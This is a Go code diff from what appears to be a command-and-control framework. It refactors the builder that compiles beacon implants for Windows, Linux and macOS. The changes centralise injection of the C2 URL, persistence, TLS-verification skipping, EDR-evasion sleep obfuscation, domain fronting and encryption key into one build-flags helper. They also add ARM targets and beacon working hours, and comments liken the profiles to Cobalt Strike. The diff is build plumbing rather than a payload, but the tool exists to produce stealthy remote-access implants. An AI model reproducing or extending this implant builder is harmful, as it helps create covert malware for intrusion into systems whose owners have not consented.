@@ -12,65 +12,170 @@ import (
 	"runtime"
 	"sort"
 	"strings"
+	"sync"
 	"text/template"
 )
 
 //go:embed agent/* powershell_template.ps1 profiles/*
 var payloadFS embed.FS
 
+var (
+	cachedGoCmd string
+	goCmdOnce   sync.Once
+)
+
+// escape replaces special characters for Go string literals.
+func escape(s string) string {
+	s = strings.ReplaceAll(s, `\`, `\\`)
+	s = strings.ReplaceAll(s, `"`, `\"`)
+	s = strings.ReplaceAll(s, "\n", `\n`)
+	s = strings.ReplaceAll(s, "\r", `\r`)
+	return s
+}
+
+// buildLdflags constructs the full -ldflags content string for go build.
+func buildLdflags(cfg ImplantConfig, profile MalleableProfile, goos string) string {
+	persist := "false"
+	if cfg.Persist {
+		persist = "true"
+	}
+	skipTLS := "false"
+	if cfg.SkipTLSVerify {
+		skipTLS = "true"
+	}
+
+	p2pMode := cfg.P2PMode
+	if p2pMode == "" && cfg.Protocol == "p2p" {
+		p2pMode = "tcp"
+	}
+
+	evasion := "false"
+	if cfg.Evasion {
+		evasion = "true"
+	}
+
+	prefix := "-s -w -buildid="
+	if goos == "windows" {
+		prefix += " -H=windowsgui"
+	}
+
+	listenerID := "0"
+	if cfg.ListenerID > 0 {
+		listenerID = fmt.Sprintf("%d", cfg.ListenerID)
+	}
+
+	return fmt.Sprintf(prefix+` -X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethodStr=%s" -X "main.ListenerIDStr=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s" -X "main.ProxyStr=%s" -X "main.CryptoKeyStr=%s" -X "main.ExpiryDateStr=%s" -X "main.EvasionStr=%s" -X "main.DomainFront=%s" -X "main.WorkingStartStr=%s" -X "main.WorkingEndStr=%s" -X "main.WorkingTZStr=%s"`,
+		escape(cfg.C2URL),
+		cfg.Interval,
+		cfg.Jitter,
+		escape(cfg.UserAgent),
+		persist,
+		skipTLS,
+		cfg.Protocol,
+		fmt.Sprintf("%t", cfg.Debug),
+		escape(profile.BeaconURI),
+		profile.Method,
+		listenerID,
+		escape(p2pMode),
+		escape(cfg.P2PParent),
+		escape(cfg.P2PListenAddr),
+		escape(cfg.DNSDomain),
+		escape(cfg.DNSServer),
+		escape(cfg.Proxy),
+		escape(cfg.CryptoKey),
+		escape(cfg.ExpiryDate),
+		evasion,
+		escape(cfg.DomainFront),
+		escape(cfg.WorkingStart),
+		escape(cfg.WorkingEnd),
+		escape(cfg.WorkingTZ),
+	)
+}
+
+// buildGoMod generates a go.mod file for the target OS.
+func buildGoMod(goos string, isDLL bool) string {
+	replaceDir := forgeC2ModuleReplace()
+
+	deps := []string{}
+	deps = append(deps, "\tgolang.org/x/sys v0.42.0")
+
+	if !isDLL {
+		deps = append(deps, "\tgolang.org/x/net v0.42.0")
+	}
+
+	if goos == "windows" {
+		deps = append(deps, "\tgithub.com/Microsoft/go-winio v0.6.2")
+		deps = append(deps, "\tmodernc.org/sqlite v1.52.0")
+	}
+
+	if goos == "windows" && !isDLL {
+		deps = append(deps, "\tgoogle.golang.org/grpc v1.71.0")
+		deps = append(deps, "\tnhooyr.io/websocket v1.8.17")
+	}
+
+	base := "module agent\n\ngo 1.25\n\nrequire (\n"
+	base += strings.Join(deps, "\n") + "\n)\n"
+	return base + replaceDir
+}
+
 // getGoCmd returns the path to the Go executable.
 // It first tries exec.LookPath, then common installation locations (especially useful
 // on Windows when the server.exe is launched without a full user PATH, e.g. by double-click).
-func getGoCmd() (string, error) {
-	// Allow overriding via environment (advanced users / CI)
-	if goBinary := os.Getenv("GO_BINARY"); goBinary != "" {
-		if _, err := os.Stat(goBinary); err == nil {
-			return goBinary, nil
-		}
-		return goBinary, nil // will fail at exec time with clear path
-	}
-
-	// Standard PATH lookup
-	if goPath, err := exec.LookPath("go"); err == nil {
-		return goPath, nil
-	}
-
-	// Windows-specific fallbacks (very common issue when running built .exe)
-	if runtime.GOOS == "windows" {
-		home := os.Getenv("USERPROFILE")
-		candidates := []string{
-			filepath.Join(home, "go", "bin", "go.exe"),
-			`C:\Program Files\Go\bin\go.exe`,
-			`C:\Program Files (x86)\Go\bin\go.exe`,
+func getGoCmd() string {
+	goCmdOnce.Do(func() {
+		// Allow overriding via environment (advanced users / CI)
+		if goBinary := os.Getenv("GO_BINARY"); goBinary != "" {
+			if _, err := os.Stat(goBinary); err == nil {
+				cachedGoCmd = goBinary
+				return
+			}
+			cachedGoCmd = goBinary
+			return
 		}
 
-		// Support the user's common sdk layout (e.g. C:\Users\xxx\sdk\go1.xx\bin\go.exe)
-		if sdkDir := filepath.Join(home, "sdk"); true {
-			if entries, err := os.ReadDir(sdkDir); err == nil {
-				for _, e := range entries {
-					if strings.HasPrefix(strings.ToLower(e.Name()), "go") {
-						c := filepath.Join(sdkDir, e.Name(), "bin", "go.exe")
-						candidates = append(candidates, c)
+		// Standard PATH lookup
+		if goPath, err := exec.LookPath("go"); err == nil {
+			cachedGoCmd = goPath
+			return
+		}
+
+		// Windows-specific fallbacks (very common issue when running built .exe)
+		if runtime.GOOS == "windows" {
+			home := os.Getenv("USERPROFILE")
+			candidates := []string{
+				filepath.Join(home, "go", "bin", "go.exe"),
+				`C:\Program Files\Go\bin\go.exe`,
+				`C:\Program Files (x86)\Go\bin\go.exe`,
+			}
+
+			// Support the user's common sdk layout (e.g. C:\Users\xxx\sdk\go1.xx\bin\go.exe)
+			if sdkDir := filepath.Join(home, "sdk"); true {
+				if entries, err := os.ReadDir(sdkDir); err == nil {
+					for _, e := range entries {
+						if strings.HasPrefix(strings.ToLower(e.Name()), "go") {
+							c := filepath.Join(sdkDir, e.Name(), "bin", "go.exe")
+							candidates = append(candidates, c)
+						}
 					}
 				}
 			}
-		}
 
-		if goroot := os.Getenv("GOROOT"); goroot != "" {
-			candidates = append(candidates, filepath.Join(goroot, "bin", "go.exe"))
-		}
-		if gopath := os.Getenv("GOPATH"); gopath != "" {
-			candidates = append(candidates, filepath.Join(gopath, "bin", "go.exe"))
-		}
+			if goroot := os.Getenv("GOROOT"); goroot != "" {
+				candidates = append(candidates, filepath.Join(goroot, "bin", "go.exe"))
+			}
+			if gopath := os.Getenv("GOPATH"); gopath != "" {
+				candidates = append(candidates, filepath.Join(gopath, "bin", "go.exe"))
+			}
 
-		for _, c := range candidates {
-			if _, err := os.Stat(c); err == nil {
-				return c, nil
+			for _, c := range candidates {
+				if _, err := os.Stat(c); err == nil {
+					cachedGoCmd = c
+					return
+				}
 			}
 		}
-	}
-
-	return "", fmt.Errorf("go executable not found in PATH. Install Go from https://go.dev/dl/ or set the GO_BINARY environment variable to the full path of go.exe/go")
+	})
+	return cachedGoCmd
 }
 
 const defaultWindowsUA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
@@ -259,6 +364,22 @@ func SaveImportedProfile(dataDir string, raw []byte) (MalleableProfile, error) {
 	return p, nil
 }
 
+// DeleteProfile removes a custom profile JSON from data/profiles/.
+func DeleteProfile(dataDir string, name string) error {
+	if dataDir == "" {
+		dataDir = "data"
+	}
+	sanitized := profileNameSanitizer.ReplaceAllString(strings.TrimSpace(name), "_")
+	if sanitized == "" || sanitized == "default" {
+		return fmt.Errorf("cannot delete default profile")
+	}
+	path := filepath.Join(dataDir, "profiles", sanitized+".json")
+	if _, err := os.Stat(path); os.IsNotExist(err) {
+		return fmt.Errorf("profile not found")
+	}
+	return os.Remove(path)
+}
+
 // MalleableProfile defines customizable beacon behavior similar to Cobalt Strike.
 type MalleableProfile struct {
 	Name        string            `json:"name"`
@@ -298,6 +419,11 @@ type ImplantConfig struct {
 	Evasion       bool   // Enable chunked sleep obfuscation (Windows EDR basics)
 	Obfuscate     bool   // Enable garble build-time obfuscation (string/literal hiding)
 	DomainFront   string // CDN front domain for domain fronting ("" = disabled)
+	Architecture  string // "amd64" (default), "arm64", "arm"
+	// Working hours
+	WorkingStart string // HH:MM start of working hours (empty = disabled)
+	WorkingEnd   string // HH:MM end of working hours (empty = disabled)
+	WorkingTZ    string // IANA timezone (empty = UTC)
 }
 
 // forgeC2ModuleReplace returns a `replace` directive for the local
@@ -342,80 +468,13 @@ func GenerateWindowsEXE(cfg ImplantConfig, outputDir string) (string, error) {
 	}
 
 	// go.mod with required external dependencies
-	replaceDir := forgeC2ModuleReplace()
-	goMod := `module agent
-
-go 1.25
-
-require (
-	github.com/Microsoft/go-winio v0.6.2
-	golang.org/x/sys v0.42.0
-	modernc.org/sqlite v1.52.0
-)
-` + replaceDir
+	goMod := buildGoMod("windows", false)
 
 	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
 		return "", err
 	}
 
-	// ldflags to inject vars - properly quoted to handle spaces/special chars in UserAgent etc.
-	// Note: only string vars can be set with -X, so we target the *Str versions (parsed inside agent).
-	userAgent := cfg.UserAgent
-	persist := "false"
-	if cfg.Persist {
-		persist = "true"
-	}
-	skipTLS := "false"
-	if cfg.SkipTLSVerify {
-		skipTLS = "true"
-	}
-
-	// Helper to escape for ldflags -X "key=value"
-	escape := func(s string) string {
-		s = strings.ReplaceAll(s, `\`, `\\`)
-		s = strings.ReplaceAll(s, `"`, `\"`)
-		return s
-	}
-
-	p2pMode := cfg.P2PMode
-	if p2pMode == "" && cfg.Protocol == "p2p" {
-		p2pMode = "tcp" // default P2P mode
-	}
-	var p2pParent, p2pListenAddr string
-	if cfg.P2PParent != "" {
-		p2pParent = cfg.P2PParent
-	}
-	if cfg.P2PListenAddr != "" {
-		p2pListenAddr = cfg.P2PListenAddr
-	}
-
-	evasion := "false"
-	if cfg.Evasion {
-		evasion = "true"
-	}
-
-	ldflags := fmt.Sprintf(`-s -w -buildid= -X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethod=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s" -X "main.ProxyStr=%s" -X "main.CryptoKeyStr=%s" -X "main.ExpiryDateStr=%s" -X "main.EvasionStr=%s" -X "main.DomainFront=%s"`,
-		escape(cfg.C2URL),
-		cfg.Interval,
-		cfg.Jitter,
-		escape(userAgent),
-		persist,
-		skipTLS,
-		cfg.Protocol,
-		fmt.Sprintf("%t", cfg.Debug),
-		escape(profile.BeaconURI),
-		profile.Method,
-		escape(p2pMode),
-		escape(p2pParent),
-		escape(p2pListenAddr),
-		escape(cfg.DNSDomain),
-		escape(cfg.DNSServer),
-		escape(cfg.Proxy),
-		escape(cfg.CryptoKey),
-		escape(cfg.ExpiryDate),
-		evasion,
-		escape(cfg.DomainFront),
-	)
+	ldflags := buildLdflags(cfg, profile, "windows")
 
 	// Output filename
 	outName := cfg.Filename
@@ -438,9 +497,9 @@ require (
 	}
 
 	// Run go mod tidy to resolve dependencies
-	goCmd, err := getGoCmd()
-	if err != nil {
-		return "", err
+	goCmd := getGoCmd()
+	if goCmd == "" {
+		return "", fmt.Errorf("go executable not found in PATH. Install Go from https://go.dev/dl/ or set the GO_BINARY environment variable")
 	}
 	tidyCmd := exec.Command(goCmd, "mod", "tidy")
 	tidyCmd.Dir = tmpDir
@@ -452,7 +511,11 @@ require (
 	}
 
 	// Build command - use explicit GOOS/GOARCH
-	if err := buildAgentBinary(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "windows", "amd64"); err != nil {
+	goarch := "amd64"
+	if cfg.Architecture == "arm64" {
+		goarch = "arm64"
+	}
+	if err := buildAgentBinary(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "windows", goarch); err != nil {
 		return "", err
 	}
 
@@ -653,75 +716,12 @@ func GenerateLinuxELF(cfg ImplantConfig, outputDir string) (string, error) {
 		return "", err
 	}
 
-	replaceDir := forgeC2ModuleReplace()
-	goMod := `module agent
-
-go 1.25
-
-require (
-	golang.org/x/net v0.42.0
-	golang.org/x/sys v0.42.0
-)
-` + replaceDir
+	goMod := buildGoMod("linux", false)
 	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
 		return "", err
 	}
 
-	userAgent := cfg.UserAgent
-	persist := "false"
-	if cfg.Persist {
-		persist = "true"
-	}
-	skipTLS := "false"
-	if cfg.SkipTLSVerify {
-		skipTLS = "true"
-	}
-
-	escape := func(s string) string {
-		s = strings.ReplaceAll(s, `\`, `\\`)
-		s = strings.ReplaceAll(s, `"`, `\"`)
-		return s
-	}
-
-	p2pMode := cfg.P2PMode
-	if p2pMode == "" && cfg.Protocol == "p2p" {
-		p2pMode = "tcp"
-	}
-	var p2pParent, p2pListenAddr string
-	if cfg.P2PParent != "" {
-		p2pParent = cfg.P2PParent
-	}
-	if cfg.P2PListenAddr != "" {
-		p2pListenAddr = cfg.P2PListenAddr
-	}
-
-	evasion := "false"
-	if cfg.Evasion {
-		evasion = "true"
-	}
-
-	ldflags := fmt.Sprintf(`-s -w -buildid= -X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethod=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s" -X "main.ProxyStr=%s" -X "main.CryptoKeyStr=%s" -X "main.ExpiryDateStr=%s" -X "main.EvasionStr=%s" -X "main.DomainFront=%s"`,
-		escape(cfg.C2URL),
-		cfg.Interval,
-		cfg.Jitter,
-		escape(userAgent),
-		persist,
-		skipTLS,
-		cfg.Protocol,
-		fmt.Sprintf("%t", cfg.Debug),
-		escape(profile.BeaconURI),
-		profile.Method,
-		escape(p2pMode),
-		escape(p2pParent),
-		escape(p2pListenAddr),
-		escape(cfg.DNSDomain),
-		escape(cfg.DNSServer),
-		escape(cfg.Proxy),
-		escape(cfg.CryptoKey),
-		escape(cfg.ExpiryDate),
-		evasion,
-		escape(cfg.DomainFront),
-	)
+	ldflags := buildLdflags(cfg, profile, "linux")
 
 	outName := cfg.Filename
 	if outName == "" {
@@ -742,11 +742,18 @@ require (
 		return "", err
 	}
 
-	goCmd, err := getGoCmd()
-	if err != nil {
-		return "", err
+	goCmd := getGoCmd()
+	if goCmd == "" {
+		return "", fmt.Errorf("go executable not found in PATH. Install Go from https://go.dev/dl/ or set the GO_BINARY environment variable")
 	}
-	if err := buildAgentBinary(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "linux", "amd64"); err != nil {
+	goarch := "amd64"
+	switch cfg.Architecture {
+	case "arm64":
+		goarch = "arm64"
+	case "arm":
+		goarch = "arm"
+	}
+	if err := buildAgentBinary(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "linux", goarch); err != nil {
 		return "", err
 	}
 
@@ -781,75 +788,12 @@ func GenerateMacOS(cfg ImplantConfig, outputDir string) (string, error) {
 		return "", err
 	}
 
-	replaceDir := forgeC2ModuleReplace()
-	goMod := `module agent
-
-go 1.25
-
-require (
-	golang.org/x/net v0.42.0
-	golang.org/x/sys v0.42.0
-)
-` + replaceDir
+	goMod := buildGoMod("darwin", false)
 	if err := os.WriteFile(filepath.Join(tmpDir, "go.mod"), []byte(goMod), 0644); err != nil {
 		return "", err
 	}
 
-	userAgent := cfg.UserAgent
-	persist := "false"
-	if cfg.Persist {
-		persist = "true"
-	}
-	skipTLS := "false"
-	if cfg.SkipTLSVerify {
-		skipTLS = "true"
-	}
-
-	escape := func(s string) string {
-		s = strings.ReplaceAll(s, `\`, `\\`)
-		s = strings.ReplaceAll(s, `"`, `\"`)
-		return s
-	}
-
-	p2pMode := cfg.P2PMode
-	if p2pMode == "" && cfg.Protocol == "p2p" {
-		p2pMode = "tcp"
-	}
-	var p2pParent, p2pListenAddr string
-	if cfg.P2PParent != "" {
-		p2pParent = cfg.P2PParent
-	}
-	if cfg.P2PListenAddr != "" {
-		p2pListenAddr = cfg.P2PListenAddr
-	}
-
-	evasion := "false"
-	if cfg.Evasion {
-		evasion = "true"
-	}
-
-	ldflags := fmt.Sprintf(`-s -w -buildid= -X "main.C2URL=%s" -X "main.IntervalStr=%d" -X "main.JitterStr=%d" -X "main.UserAgent=%s" -X "main.PersistStr=%s" -X "main.SkipTLSVerifyStr=%s" -X "main.Protocol=%s" -X "main.DebugStr=%s" -X "main.BeaconURIStr=%s" -X "main.BeaconMethod=%s" -X "main.P2PMode=%s" -X "main.P2PParent=%s" -X "main.P2PListenAddr=%s" -X "main.DNSDomain=%s" -X "main.DNSServer=%s" -X "main.ProxyStr=%s" -X "main.CryptoKeyStr=%s" -X "main.ExpiryDateStr=%s" -X "main.EvasionStr=%s" -X "main.DomainFront=%s"`,
-		escape(cfg.C2URL),
-		cfg.Interval,
-		cfg.Jitter,
-		escape(userAgent),
-		persist,
-		skipTLS,
-		cfg.Protocol,
-		fmt.Sprintf("%t", cfg.Debug),
-		escape(profile.BeaconURI),
-		profile.Method,
-		escape(p2pMode),
-		escape(p2pParent),
-		escape(p2pListenAddr),
-		escape(cfg.DNSDomain),
-		escape(cfg.DNSServer),
-		escape(cfg.Proxy),
-		escape(cfg.CryptoKey),
-		escape(cfg.ExpiryDate),
-		evasion,
-		escape(cfg.DomainFront),
-	)
+	ldflags := buildLdflags(cfg, profile, "darwin")
 
 	outName := cfg.Filename
 	if outName == "" {
@@ -866,11 +810,15 @@ require (
 		return "", err
 	}
 
-	goCmd, err := getGoCmd()
-	if err != nil {
-		return "", err
+	goCmd := getGoCmd()
+	if goCmd == "" {
+		return "", fmt.Errorf("go executable not found in PATH. Install Go from https://go.dev/dl/ or set the GO_BINARY environment variable")
 	}
-	if err := buildAgentBinary(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "darwin", "amd64"); err != nil {
+	goarch := "amd64"
+	if cfg.Architecture == "arm64" {
+		goarch = "arm64"
+	}
+	if err := buildAgentBinary(goCmd, tmpDir, ldflags, outPath, cfg.Obfuscate, "darwin", goarch); err != nil {
 		return "", err
 	}
 
